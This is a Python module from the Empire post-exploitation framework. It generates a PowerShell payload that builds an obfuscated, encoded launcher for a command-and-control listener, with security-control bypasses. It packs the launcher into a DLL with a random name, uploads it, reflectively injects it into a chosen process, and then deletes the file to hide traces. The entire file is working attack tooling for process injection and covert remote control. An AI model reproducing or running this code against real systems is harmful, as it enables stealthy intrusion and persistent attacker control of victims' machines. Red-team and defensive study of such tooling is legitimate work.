from __future__ import print_function

import random
import string
from builtins import object, str
from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        def rand_text_alphanumeric(
            size=15, chars=string.ascii_uppercase + string.digits
        ):
            return "".join(random.choice(chars) for _ in range(size))

        # staging options
        fname = rand_text_alphanumeric() + ".dll"
        listener_name = params["Listener"]
        proc_name = params["ProcName"].strip()
        upload_path = params["UploadPath"].strip()
        arch = params["Arch"].strip()
        full_upload_path = upload_path + "\\" + fname
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        if (params["Obfuscate"]).lower() == "true":
            launcher_obfuscate = True
        else:
            launcher_obfuscate = False
        launcher_obfuscate_command = params["ObfuscateCommand"]

        if proc_name == "":
            return handle_error_message("[!] ProcName must be specified.")

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = ""
        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: %s" % (listener_name))
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(
                listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                bypasses=params["Bypasses"],
            )

            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")
            else:
                launcher_code = launcher.split(" ")[-1]

                script_end += (
                    "Invoke-ReflectivePEInjection -PEPath %s -ProcName %s "
                    % (full_upload_path, proc_name)
                )
                dll = main_menu.stagers.generate_dll(launcher_code, arch)
                upload_script = main_menu.stagers.generate_upload(dll, full_upload_path)

                script += "\r\n"
                script += upload_script
                script += "\r\n"

                script_end += "\r\n"
                script_end += "Remove-Item -Path %s" % full_upload_path

                script = main_menu.modulesv2.finalize_module(
                    script=script,
                    script_end=script_end,
                    obfuscate=obfuscate,
                    obfuscation_command=obfuscation_command,
                )
                return script
